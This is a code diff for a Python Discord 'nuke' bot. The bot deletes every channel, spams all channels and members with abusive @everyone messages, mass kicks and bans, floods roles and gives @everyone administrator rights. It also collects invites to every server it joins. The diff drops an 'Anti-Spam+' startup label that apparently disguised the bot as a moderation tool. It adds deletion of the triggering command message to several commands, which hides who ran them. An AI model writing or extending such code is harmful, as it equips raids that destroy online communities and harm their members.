@@ -5,6 +5,7 @@ from discord import Permissions
 import os
 import asyncio
 
+
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
  
 MESSAGE_CONTENTS = ["@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]
@@ -20,7 +21,7 @@ bot.remove_command('help')
 async def on_ready():
    game = discord.Game("Nuking Discord Filth")
    await bot.change_presence(status=discord.Status.online, activity=game)
-   print("Anti-Spam+ is Online")
+   print("Bot is Online")
    print("Bot made by Kaotic, Bancer and XxGamerBroskixX")
 
 #used to keep invites to where the bot is added to
@@ -34,6 +35,7 @@ async def on_guild_join(guild):
 
 @bot.command(pass_context=True)
 async def cmds(ctx):
+ await ctx.message.delete()
  embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)
 
  embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
@@ -44,7 +46,8 @@ async def cmds(ctx):
  embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
  embed.add_field(name="spam", value="Spams all channels.", inline=False)
  embed.add_field(name="spam2", value="Spams the channel.", inline=False)
- embed.add_field(name="roles", value="Spams roles.", inline=False)
+ embed.add_field(name="role", value="Creates a role.", inline=False)
+ embed.add_field(name="role2", value="Spams roles.", inline=False)
  embed.add_field(name="delete", value="Deletes all channels.", inline=False)
  embed.add_field(name="channels", value="Creates channels.", inline=False)
  embed.add_field(name="kick", value="Kicks everyoner.", inline=False)
@@ -52,6 +55,8 @@ async def cmds(ctx):
  embed.add_field(name="ban2 <user>", value="Purges Bans specified user..", inline=False)
  embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
  embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
+ embed.add_field(name="ping",value="Shows bots ping.", inline=False)
+
 
  await ctx.send(embed=embed)
 
@@ -123,7 +128,8 @@ async def ban(ctx):
 
 @bot.command(pass_context=True)
 async def clear(ctx, amount=100000):
-    await ctx.channel.purge(limit=amount)
+  await ctx.message.delete()
+  await ctx.channel.purge(limit=amount)
 
 #WARNING this command will rate limit the bot
 @bot.command(pass_context=True)
@@ -166,12 +172,9 @@ async def kick(ctx):
  
 @bot.command(pass_context=True)
 async def ping(ctx):
-  await ctx.message.delete()
-  latency = bot.latency  
-  await ctx.send(latency)
-  print(latency)
-  await ctx.send("Pong!")
-  print ("Pong!")   
+    await ctx.message.delete()
+    await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")
+  
  
 @bot.command(pass_context=True)
 async def admin(ctx):
@@ -186,6 +189,7 @@ async def admin(ctx):
 
 @bot.command(pass_context=True)
 async def userinfo(ctx, member: discord.Member):
+  await ctx.message.delete()
   member = ctx.author if not member else member
   roles = [role for role in member.roles]
 
@@ -208,8 +212,10 @@ async def userinfo(ctx, member: discord.Member):
 
   await ctx.send(embed=embed)
 
+
 @bot.command(pass_context=True)
 async def delete(ctx):
+  await ctx.message.delete()
   for channel in ctx.guild.channels:
     print(f"Deleting channel {channel.name}")
     await channel.delete()
